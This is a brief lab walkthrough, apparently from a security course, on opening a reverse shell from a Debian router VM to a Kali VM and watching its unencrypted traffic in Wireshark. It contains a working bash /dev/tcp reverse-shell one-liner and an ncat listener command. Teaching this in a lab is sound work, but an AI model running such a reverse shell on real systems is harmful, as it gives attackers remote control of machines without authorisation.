# Reverse Shell

Open your Debian Router and your Kali VM.

Create a listener on Kali VM on port 1234:

`ncat -l -p 1234`

On the Debian Router write the following command:

`/bin/bash –i >& /dev/tcp/<ip-address-kali>/1234 0>&1`

To find the ip-address, simply put `ifconfig` in the commandline on Kali.

Put any command on the Debian Router Connection, like: `ls` or `ifconfig`.

Filter with Wireshark on port 1234 with `tcp.port == 1234`, put the commands once again and watch the traffic. You can see the data on Wireshark, it's not encrypted.

To stop the Reverse Shell, go back to the Debian Router, open a new terminal (HOST key + F2), switch to root. To kill the bash use the command `pkill -9 bash`
